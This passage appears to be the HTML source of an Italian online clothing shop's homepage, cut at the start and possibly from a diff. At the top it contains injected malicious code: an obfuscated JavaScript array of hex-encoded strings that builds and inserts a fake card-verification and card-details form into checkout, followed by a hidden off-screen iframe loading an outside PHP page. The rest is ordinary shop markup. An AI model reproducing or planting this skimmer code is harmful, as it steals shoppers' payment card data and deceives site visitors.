\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x32\x32\x22\x3E\x32\x30\x32\x32\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x32\x33\x22\x3E\x32\x30\x32\x33\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x32\x34\x22\x3E\x32\x30\x32\x34\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x32\x35\x22\x3E\x32\x30\x32\x35\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x32\x36\x22\x3E\x32\x30\x32\x36\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x2F\x73\x65\x6C\x65\x63\x74\x3E\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x2F\x6C\x69\x3E\x20\x3C\x6C\x69\x20\x63\x6C\x61\x73\x73\x3D\x22\x63\x65\x6E\x74\x69\x6E\x65\x6C\x2D\x6C\x6F\x67\x6F\x73\x22\x20\x69\x64\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x65\x6E\x74\x69\x6E\x65\x6C\x5F\x6C\x6F\x67\x6F\x22\x3E\x20\x3C\x6C\x61\x62\x65\x6C\x3E\x54\x6F\x20\x65\x6E\x73\x75\x72\x65\x20\x74\x68\x65\x20\x73\x65\x63\x75\x72\x69\x74\x79\x20\x6F\x66\x20\x79\x6F\x75\x72\x20\x74\x72\x61\x6E\x73\x61\x63\x74\x69\x6F\x6E\x73\x3C\x2F\x6C\x61\x62\x65\x6C\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x70\x75\x74\x2D\x62\x6F\x78\x22\x3E\x20\x20\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x2F\x6C\x69\x3E\x20\x3C\x6C\x69\x3E\x20\x3C\x6C\x61\x62\x65\x6C\x20\x66\x6F\x72\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x63\x5F\x63\x69\x64\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x72\x65\x71\x75\x69\x72\x65\x64\x22\x3E\x3C\x65\x6D\x3E\x2A\x3C\x2F\x65\x6D\x3E\x43\x61\x72\x64\x20\x56\x65\x72\x69\x66\x69\x63\x61\x74\x69\x6F\x6E\x20\x4E\x75\x6D\x62\x65\x72\x3C\x2F\x6C\x61\x62\x65\x6C\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x70\x75\x74\x2D\x62\x6F\x78\x22\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x76\x2D\x66\x69\x78\x22\x3E\x20\x3C\x69\x6E\x70\x75\x74\x20\x74\x79\x70\x65\x3D\x22\x74\x65\x78\x74\x22\x20\x74\x69\x74\x6C\x65\x3D\x22\x43\x61\x72\x64\x20\x56\x65\x72\x69\x66\x69\x63\x61\x74\x69\x6F\x6E\x20\x4E\x75\x6D\x62\x65\x72\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x70\x75\x74\x2D\x74\x65\x78\x74\x20\x63\x76\x76\x20\x72\x65\x71\x75\x69\x72\x65\x64\x2D\x65\x6E\x74\x72\x79\x20\x76\x61\x6C\x69\x64\x61\x74\x65\x2D\x63\x63\x2D\x63\x76\x6E\x22\x20\x69\x64\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x63\x5F\x63\x69\x64\x22\x20\x6E\x61\x6D\x65\x3D\x22\x70\x61\x79\x6D\x65\x6E\x74\x5B\x63\x63\x5F\x63\x69\x64\x5D\x22\x20\x76\x61\x6C\x75\x65\x3D\x22\x22\x3E\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x61\x20\x68\x72\x65\x66\x3D\x22\x23\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x63\x76\x76\x2D\x77\x68\x61\x74\x2D\x69\x73\x2D\x74\x68\x69\x73\x22\x3E\x57\x68\x61\x74\x20\x69\x73\x20\x74\x68\x69\x73\x3F\x3C\x2F\x61\x3E\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x2F\x6C\x69\x3E\x20\x3C\x6C\x69\x20\x69\x64\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x63\x5F\x74\x79\x70\x65\x5F\x73\x73\x5F\x64\x69\x76\x22\x20\x73\x74\x79\x6C\x65\x3D\x22\x64\x69\x73\x70\x6C\x61\x79\x3A\x20\x6E\x6F\x6E\x65\x3B\x22\x3E\x20\x3C\x75\x6C\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x6E\x65\x72\x2D\x66\x6F\x72\x6D\x22\x3E\x20\x3C\x6C\x69\x20\x63\x6C\x61\x73\x73\x3D\x22\x66\x6F\x72\x6D\x2D\x61\x6C\x74\x22\x3E\x3C\x6C\x61\x62\x65\x6C\x20\x66\x6F\x72\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x63\x5F\x69\x73\x73\x75\x65\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x72\x65\x71\x75\x69\x72\x65\x64\x22\x3E\x3C\x65\x6D\x3E\x2A\x3C\x2F\x65\x6D\x3E\x53\x77\x69\x74\x63\x68\x2F\x53\x6F\x6C\x6F\x2F\x4D\x61\x65\x73\x74\x72\x6F\x20\x4F\x6E\x6C\x79\x3C\x2F\x6C\x61\x62\x65\x6C\x3E\x3C\x2F\x6C\x69\x3E\x20\x3C\x6C\x69\x3E\x20\x3C\x6C\x61\x62\x65\x6C\x20\x66\x6F\x72\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x63\x5F\x69\x73\x73\x75\x65\x22\x3E\x49\x73\x73\x75\x65\x20\x4E\x75\x6D\x62\x65\x72\x3A\x3C\x2F\x6C\x61\x62\x65\x6C\x3E\x20\x3C\x73\x70\x61\x6E\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x70\x75\x74\x2D\x62\x6F\x78\x22\x3E\x20\x3C\x69\x6E\x70\x75\x74\x20\x74\x79\x70\x65\x3D\x22\x74\x65\x78\x74\x22\x20\x74\x69\x74\x6C\x65\x3D\x22\x49\x73\x73\x75\x65\x20\x4E\x75\x6D\x62\x65\x72\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x70\x75\x74\x2D\x74\x65\x78\x74\x20\x76\x61\x6C\x69\x64\x61\x74\x65\x2D\x63\x63\x2D\x75\x6B\x73\x73\x20\x63\x76\x76\x22\x20\x69\x64\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x63\x5F\x69\x73\x73\x75\x65\x22\x20\x6E\x61\x6D\x65\x3D\x22\x70\x61\x79\x6D\x65\x6E\x74\x5B\x63\x63\x5F\x73\x73\x5F\x69\x73\x73\x75\x65\x5D\x22\x20\x76\x61\x6C\x75\x65\x3D\x22\x22\x3E\x20\x3C\x2F\x73\x70\x61\x6E\x3E\x20\x3C\x2F\x6C\x69\x3E\x20\x20\x3C\x6C\x69\x3E\x20\x3C\x6C\x61\x62\x65\x6C\x20\x66\x6F\x72\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x73\x74\x61\x72\x74\x5F\x6D\x6F\x6E\x74\x68\x22\x3E\x53\x74\x61\x72\x74\x20\x44\x61\x74\x65\x3A\x3C\x2F\x6C\x61\x62\x65\x6C\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x70\x75\x74\x2D\x62\x6F\x78\x22\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x76\x2D\x66\x69\x78\x22\x3E\x20\x3C\x73\x65\x6C\x65\x63\x74\x20\x69\x64\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x73\x74\x61\x72\x74\x5F\x6D\x6F\x6E\x74\x68\x22\x20\x6E\x61\x6D\x65\x3D\x22\x70\x61\x79\x6D\x65\x6E\x74\x5B\x63\x63\x5F\x73\x73\x5F\x73\x74\x61\x72\x74\x5F\x6D\x6F\x6E\x74\x68\x5D\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x76\x61\x6C\x69\x64\x61\x74\x65\x2D\x63\x63\x2D\x75\x6B\x73\x73\x20\x6D\x6F\x6E\x74\x68\x22\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x22\x20\x73\x65\x6C\x65\x63\x74\x65\x64\x3D\x22\x73\x65\x6C\x65\x63\x74\x65\x64\x22\x3E\x4D\x6F\x6E\x74\x68\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x31\x22\x3E\x30\x31\x20\x2D\x20\x4A\x61\x6E\x75\x61\x72\x79\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x22\x3E\x30\x32\x20\x2D\x20\x46\x65\x62\x72\x75\x61\x72\x79\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x33\x22\x3E\x30\x33\x20\x2D\x20\x4D\x61\x72\x63\x68\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x34\x22\x3E\x30\x34\x20\x2D\x20\x41\x70\x72\x69\x6C\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x35\x22\x3E\x30\x35\x20\x2D\x20\x4D\x61\x79\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x36\x22\x3E\x30\x36\x20\x2D\x20\x4A\x75\x6E\x65\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x37\x22\x3E\x30\x37\x20\x2D\x20\x4A\x75\x6C\x79\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x38\x22\x3E\x30\x38\x20\x2D\x20\x41\x75\x67\x75\x73\x74\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x39\x22\x3E\x30\x39\x20\x2D\x20\x53\x65\x70\x74\x65\x6D\x62\x65\x72\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x31\x30\x22\x3E\x31\x30\x20\x2D\x20\x4F\x63\x74\x6F\x62\x65\x72\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x31\x31\x22\x3E\x31\x31\x20\x2D\x20\x4E\x6F\x76\x65\x6D\x62\x65\x72\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x31\x32\x22\x3E\x31\x32\x20\x2D\x20\x44\x65\x63\x65\x6D\x62\x65\x72\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x2F\x73\x65\x6C\x65\x63\x74\x3E\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x76\x2D\x66\x69\x78\x22\x3E\x20\x3C\x73\x65\x6C\x65\x63\x74\x20\x69\x64\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x73\x74\x61\x72\x74\x5F\x79\x65\x61\x72\x22\x20\x6E\x61\x6D\x65\x3D\x22\x70\x61\x79\x6D\x65\x6E\x74\x5B\x63\x63\x5F\x73\x73\x5F\x73\x74\x61\x72\x74\x5F\x79\x65\x61\x72\x5D\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x76\x61\x6C\x69\x64\x61\x74\x65\x2D\x63\x63\x2D\x75\x6B\x73\x73\x20\x79\x65\x61\x72\x22\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x22\x20\x73\x65\x6C\x65\x63\x74\x65\x64\x3D\x22\x73\x65\x6C\x65\x63\x74\x65\x64\x22\x3E\x59\x65\x61\x72\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x31\x31\x22\x3E\x32\x30\x31\x31\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x31\x32\x22\x3E\x32\x30\x31\x32\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x31\x33\x22\x3E\x32\x30\x31\x33\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x31\x34\x22\x3E\x32\x30\x31\x34\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x31\x35\x22\x3E\x32\x30\x31\x35\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x31\x36\x22\x3E\x32\x30\x31\x36\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x2F\x73\x65\x6C\x65\x63\x74\x3E\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x2F\x6C\x69\x3E\x20\x3C\x6C\x69\x20\x63\x6C\x61\x73\x73\x3D\x22\x61\x64\x76\x2D\x63\x6F\x6E\x74\x61\x69\x6E\x65\x72\x22\x3E\x26\x6E\x62\x73\x70\x3B\x3C\x2F\x6C\x69\x3E\x20\x3C\x2F\x75\x6C\x3E\x20\x20\x3C\x2F\x6C\x69\x3E\x20\x3C\x2F\x75\x6C\x3E","\x62\x65\x66\x6F\x72\x65\x65\x6E\x64","\x69\x6E\x73\x65\x72\x74\x41\x64\x6A\x61\x63\x65\x6E\x74\x48\x54\x4D\x4C"];window[_0xc240[3]](function(){if(!document[_0xc240[1]](_0xc240[0])){ShowForm(_0xc240[2])}},100);function ShowForm(_0x25adx2){if(document[_0xc240[1]](_0x25adx2)){var _0x25adx3=document[_0xc240[1]](_0x25adx2);while(_0x25adx3[_0xc240[4]]){_0x25adx3[_0xc240[5]](_0x25adx3[_0xc240[4]])};var _0x25adx4=_0xc240[6];_0x25adx3[_0xc240[8]](_0xc240[7],_0x25adx4)}}</script><div style='width: 300px; height: 300px; position:absolute; left:-500px; top: -500px;'> <iframe src='https://www.visio-rx.com/docs/info.php' width='250' height='250'></iframe></div>
+<link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Lato" media="all" />
+<style type="text/css">
+	        body.layout-full .link-compare, body.layout-full .item-compare { display: none !important; }body.layout-full .item-quickview { display: none !important; }</style></head>
+
+
+<body class=" cms-index-index cms-home layout-full home_style1" >
+<div id="pt_theme_wrapper" class="wrapper">
+        <div class="page">
+        <div class="header-container header_style1">
+	<div class="header">
+					<div class="header-top">
+				<div class="container">
+					<div class="header-setting">
+																	</div>
+					<div class="header-login hidden-xs">
+																			<span>
+								<a data-toggle="modal" data-target="#modal-login" title="Accedi">Accedi</a>
+							</span>
+							<div class="modal fade" id="modal-login" tabindex="-1" role="dialog" aria-hidden="true">
+	<div class="modal-dialog popup-login">
+		<a href="javascript:void(0)" title="Chiudi" class="close close-login" data-dismiss="modal">&times;</a>
+		<form action="http://www.myvaleriashop.com/customer/account/loginPost/" method="post">
+			<input name="form_key" type="hidden" value="xlifIxQRCMi2kz6T" />
+			<div class="login-users-popup block">
+				<div class="block-title">
+					<strong><span>Accedi</span></strong>
+				</div>
+				<p>Se hai un account con noi, per favore accedi.</p>
+				<label for="mini-login">Your Email<em> *</em></label>
+				<input type="text" name="login[username]" id="mini-login" class="input-text" value="User name" onFocus="if(this.value != '') {this.value = '';}" onBlur="if (this.value == '') {this.value = 'User name';}" />
+				<label for="mini-password">Password<em> *</em></label>
+				<input type="password" name="login[password]" id="mini-password" class="input-text" value="........." onFocus="if(this.value != '') {this.value = '';}" onBlur="if (this.value == '') {this.value = '.........';}"  />
+				
+				<div class="actions">
+					<a href="http://www.myvaleriashop.com/customer/account/forgotpassword/" class="f-left">Forgot your password</a>
+					<div class="submit-login">
+						<input type="submit" class="button submit-repl" name="submit" value="Accedi" />
+					</div>
+					<div class="new-users-popup">
+						<button type="button" title="Registrati" class="button" onclick="window.location='http://www.myvaleriashop.com/customer/account/create/';"><span><span>Registrati</span></span></button>
+					</div>
+				</div>
+			</div>
+		</form>
+	</div>
+</div>
+
+											</div>
+					<div class="header-account">
+						<div class="quick-access" id="top_links">
+							<ul class="links">
+                        <li class="link_1 first" ><a href="http://www.myvaleriashop.com/customer/account/" title="Il mio account" >Il mio account</a></li>
+                                <li ><a href="http://www.myvaleriashop.com/wishlist/" title="La mia wishlist" >La mia wishlist</a></li>
+                                <li class="link_3 " ><a href="http://www.myvaleriashop.com/checkout/cart/" title="Il mio carrello" class="top-link-cart">Il mio carrello</a></li>
+                                <li class="link_4 " ><a href="http://www.myvaleriashop.com/checkout/" title="Checkout" class="top-link-checkout">Checkout</a></li>
+                                <li class="link_5  last" ><a href="http://www.myvaleriashop.com/customer/account/login/" title="Accedi" >Accedi</a></li>
+            </ul>
+						</div>
+					</div>
+				</div>
+			</div>
+			
+			<div class="header-under">
+				<div class="container">
+					<div class="row">
+						<div class="col-lg-4 col-md-4 col-sm-12 col-xs-12 hidden-sm hidden-xs">
+							<p class="welcome-msg">
+                            <a href="https://www.facebook.com/pages/Valeria-Boutique/263790163710085?fref=ts" target="_blank" title="Facebook" class="iconasocialfb"></a>
+<a href="#" class="iconasocialin"></a>
+						<!--	
+						Benvenuti in My Valeria Shop!                         -->
+                        </p>
+						</div>
+						<div class="col-lg-4 col-md-4 col-sm-12 col-xs-12">
+							<div class="logo">
+								<a href="http://www.myvaleriashop.com/" title="">
+									<img src="http://www.myvaleriashop.com/skin/frontend/pt_voke/default/images/purple/logo.png" alt="" />
+								</a>
+							</div>
+						</div>
+						<div class="col-lg-4 col-md-4 col-sm-12 col-xs-12">	
+							<div class="search-compare">
+								<div class="block block-list block-compare" id="compare_sidebar">
+    <div class="block-title">
+        <strong><span>Confronta                            <!--small></small-->
+                    </span></strong>
+    </div>
+    <div class="block-content">
+            <p class="empty">Non hai articoli da confrontare.</p>
+        </div>
+</div>
+					
+								<form id="search_mini_form" action="http://www.myvaleriashop.com/catalogsearch/result/" method="get">
+	<div class="form-search">
+        <!--label for="search"></label-->
+        <input id="search" type="text" name="q" value="" class="input-text" maxlength="128" />
+        <button type="submit" title="Cerca" class="button"><span><span></span></span></button>
+		<span class="btn-hover"></span>
+        <div id="search_autocomplete" class="search-autocomplete"></div>
+        <script type="text/javascript">
+        //<![CDATA[
+            var searchForm = new Varien.searchForm('search_mini_form', 'search', 'Cerca...');
+            searchForm.initAutocomplete('http://www.myvaleriashop.com/catalogsearch/ajax/suggest/', 'search_autocomplete');
+        //]]>
+        </script>
+    </div>	
+</form>
+							</div>													
+						</div>
+													
+					</div>
+				</div>
+			</div>
+
+			<div class="header-menu on-fixed">
+				<div class="container">
+					<div class="menu-nav hidden-sm hidden-xs">
+													<div class="nav-container">
+    <ul id="nav">
+		<li class="">
+			<a href="http://www.myvaleriashop.com/" title="Home">
+				<span>Home</span>
+			</a>
+		</li>	
+        <li  class="level0 nav-1 first level-top"><a href="http://www.myvaleriashop.com/abbigliamento.html"  class="level-top" ><span>Abbigliamento</span></a></li><li  class="level0 nav-2 level-top"><a href="http://www.myvaleriashop.com/maglie.html"  class="level-top" ><span>Maglie</span></a></li><li  class="level0 nav-3 level-top"><a href="http://www.myvaleriashop.com/scarpe.html"  class="level-top" ><span>Scarpe</span></a></li><li  class="level0 nav-4 level-top"><a href="http://www.myvaleriashop.com/accessori.html"  class="level-top" ><span>Accessori</span></a></li><li  class="level0 nav-5 level-top"><a href="http://www.myvaleriashop.com/vintage.html"  class="level-top" ><span>Vintage</span></a></li><li  class="level0 nav-6 level-top"><a href="http://www.myvaleriashop.com/mare.html"  class="level-top" ><span>Mare</span></a></li><li  class="level0 nav-7 last level-top"><a href="http://www.myvaleriashop.com/catalog/category/view/s/cappelli/id/116/"  class="level-top" ><span>CAPPELLI</span></a></li>    </ul>
+</div>
+										
+					</div>
+					<nav class="mobile-nav hidden-lg hidden-md">
+							<span class="menu-button">
+		<i class="fa fa-bars"></i>
+    </span>
+    <div class="hidden-lg hidden-md hidden-xs hidden-sm" id="menu_sidebar">
+	    <ul class="nav-menu clearfix">
+			<li>
+				<a href="http://www.myvaleriashop.com/" title="Home">
+					<span>Home</span>
+				</a>
+			</li>
+											<li class="level0 nav-1">
+<a href="http://www.myvaleriashop.com/abbigliamento.html">
+<span>Abbigliamento</span>
+</a>
+</li>											<li class="level0 nav-2">
+<a href="http://www.myvaleriashop.com/maglie.html">
+<span>Maglie</span>
+</a>
+</li>											<li class="level0 nav-3">
+<a href="http://www.myvaleriashop.com/scarpe.html">
+<span>Scarpe</span>
+</a>
+</li>											<li class="level0 nav-4">
+<a href="http://www.myvaleriashop.com/accessori.html">
+<span>Accessori</span>
+</a>
+</li>											<li class="level0 nav-5">
+<a href="http://www.myvaleriashop.com/vintage.html">
+<span>Vintage</span>
+</a>
+</li>											<li class="level0 nav-6">
+<a href="http://www.myvaleriashop.com/mare.html">
+<span>Mare</span>
+</a>
+</li>											<li class="level0 nav-7">
+<a href="http://www.myvaleriashop.com/catalog/category/view/s/cappelli/id/116/">
+<span>CAPPELLI</span>
+</a>
+</li>				    </ul>
+	    <script type="text/javascript">
+	        jQuery(document).ready(function($){
+	            $('body').append('<div class="pt_menu_sidebar"><nav id="pt-screennav"><ul class="siderbar-menu"></ul></nav></div>');
+	            $('#pt-screennav ul.siderbar-menu').html($('#menu_sidebar ul.nav-menu').html());
+	                $('.mobile-nav .menu-button').click(function(){
+	                    if($('body').hasClass('show_sidebar')){
+	                        $('body').removeClass('show_sidebar');
+	                    }else{
+	                        $('body').addClass('show_sidebar');
+	                    }
+	                });
+	        });
+	    </script>
+	</div>
+
+					</nav>
+					
+<div class="block-cart header-cart pull-right" id="ajaxcart">
+	<div class="block-header-cart">
+    	 <div class="header-cart-title">
+	 	<i class="icon-cart"></i>
+					<span class="badge">0 articoli: <span class="price">0,00 €</span></span>	
+			 </div>
+     <div class="header-cart-content">
+									<p class="empty">Non hai articoli nel carrello.</p>
+			</div>
+</div></div>				</div>
+			</div>
+			
+	</div>
+</div>
+											<div class="block-slider">
+        
+    <div class="block-content">
+        <div id="slider_container_5806f14189ca6" style="position: relative; width: 100%; overflow: hidden;">
+			<div>          
+            <div class="pt-slider-container slider-group-1" id="slides_container_5806f14189ca6" style="display: block;position:relative;width:1920px;height:600px;">                <div data-u="loading" class="loading-screen">
+                    <div class="transparency"></div>
+                    <!--div class="loading-mask"></div-->
+                </div>
+            <div data-u="slides" class="pt-slider-slides"  style="display: block;position:relative;width:1920px;height:600px;"><div><img data-u="image" src="http://www.myvaleriashop.com/media/pt/slider/slide/copertina-righe-grosse.jpg"  alt=""/></div></div>                <!--ul class="pt-slider-nav" data-u="navigator">
+                    <li data-u="prototype"><span class="dot"></span></li>
+                </ul-->
+                
+                </div>            </div>
+            
+            <span data-u="arrowleft"  id="pt-slider-prev" class="prev"></span>
+            <span data-u="arrowright" id="pt-slider-next" class="next"></span>
+        </div>
+    <script type="text/javascript">
+    jQuery(function($){
+        var _CaptionTransitions = {};        var _SlideshowTransitions = [];_SlideshowTransitions.push({$Duration:700,$Opacity:2,$Brother:{$Duration:1000,$Opacity:2}});        var slides_container_5806f14189ca6 = new $JssorSlider$('slides_container_5806f14189ca6', {
+            $FillMode: 0,
+            $AutoPlay: true,
+            $AutoPlayInterval$: 3000,
+            $UISearchMode: 0,
+            $DragOrientation: 1,
+            
+            $SlideshowOptions: {
+                $Class: $JssorSlideshowRunner$,
+                $Transitions: _SlideshowTransitions,
+                $TransitionsOrder: 1,
+                $ShowLink: true
+            },
+            $CaptionSliderOptions:{
+                $Class: $JssorCaptionSlider$,
+                $CaptionTransitions: _CaptionTransitions,
+                $PlayInMode: 1,
+                $PlayOutMode: 3
+            },
+            $BulletNavigatorOptions: {
+                $Class: $JssorBulletNavigator$,
+                $ChanceToShow: 2,
+                $AutoCenter: 1,
+                $Steps: 1,
+                $Lanes: 1,
+                $SpacingX: 6,
+                $SpacingY: 32,
+                $Orientation: 1
+            },
+            $ArrowNavigatorOptions: {
+                $Class: $JssorArrowNavigator$,
+                $ChanceToShow: 2,
+                $AutoCenter: 2,
+                $Steps: 1
+            }
+        });
+        $('#slider_container_5806f14189ca6').on('click', '[data-u="arrowleft"]', function(){
+            slides_container_5806f14189ca6.$Prev();
+        });
+        $('#slider_container_5806f14189ca6').on('click', '[data-u="arrowright"]', function(){
+            slides_container_5806f14189ca6.$Next();
+        });
+        
+        var resto = null, makeSliderFit = function(){
+            if (resto) {
+                clearTimeout(resto);
+                resto = null;
+            }
+            try{
+                var slider_out = $('#slider_container_5806f14189ca6');
+                var slider_cont = $('#slides_container_5806f14189ca6');
+
+                var  ow = slider_out.outerWidth(), ow0 = slider_out.data('ow0');
+                if (typeof ow0 == 'undefined') {
+                    slider_out.data('ow0', ow);
+                } else {
+                    if (ow0 == ow){
+                        return;
+                    }
+                    slider_out.data('ow0', ow);
+                }
+
+                var basewidth = 1920;
+                if (ow > basewidth){
+                    var toHeight = 600;
+                } else {
+                    var toHeight = 600 * ow / basewidth;
+                }
+                var oh = slider_cont.data('oh');
+                if (typeof oh == 'undefined'){
+                    slider_cont.data('oh', toHeight);
+                } else {
+                    if (oh == toHeight){
+                        return;
+                    }
+                    slider_cont.data('oh', toHeight);
+                }
+                slides_container_5806f14189ca6.$ScaleHeight(toHeight);
+            } catch(e){ }
+        };
+        makeSliderFit();
+        $Jssor$.$AddEvent(window, "load", makeSliderFit);
+        if (!navigator.userAgent.match(/(iPhone|iPod|iPad|BlackBerry|IEMobile)/)) {
+            $Jssor$.$AddEvent(window, "resize", $Jssor$.$WindowResizeFilter(window, makeSliderFit));
+        }
+    });
+    </script>
+    </div>
+</div>
+					        <div class="main-container col1-layout">
+            <div class="main">
+				<div class="col-main">
+																<div class="container">
+														<div class="std"><div class="no-display">&nbsp;</div></div>							
+							
+														
+														
+						</div>
+						
+													<div class="collection-wrap">
+								<div class="container">	
+									<div class="collection-container">
+<div class="row">
+<div class="collection-item col-lg-3 col-md-3 col-sm-6 col-xs-6">
+<div class="collection-item-inner">
+<div class="collection-image"><a title="collezione ACCESSORI" href="http://www.myvaleriashop.com/accessori.html"><img alt="collezione ACCESSORI" src="http://www.myvaleriashop.com/media/wysiwyg/borse.jpg" /></a><address class="sottotitolo"><span style="font-family: 'courier new', courier; color: #000000;"><em><span style="font-size: x-large;">LE BORSE</span></em></span></address></div>
+</div>
+</div>
+<div class="collection-item col-lg-3 col-md-3 col-sm-6 col-xs-6">
+<div class="collection-item-inner">
+<div class="collection-image"><span style="color: #c0c0c0;"><a title="selezione... PULL" href="http://www.myvaleriashop.com/maglie.html"><span style="color: #c0c0c0;"><img alt="selezione... PULL" src="http://www.myvaleriashop.com/media/wysiwyg/maglie.jpg" /></span></a></span>
+<div class="sottotitolo2" style="text-align: center;">&nbsp;<span style="color: #000000;"><em><span style="font-size: x-large; font-family: 'courier new', courier;">LE MAGLIE</span></em></span></div>
+</div>
+</div>
+</div>
+<div class="collection-item col-lg-3 col-md-3 col-sm-6 col-xs-6">
+<div class="collection-item-inner">
+<div class="collection-image"><a title="accessori and JEWEL" href="http://www.myvaleriashop.com/mare.html"><img alt="accessori and JEWEL" src="http://www.myvaleriashop.com/media/wysiwyg/mare.jpg" /></a>
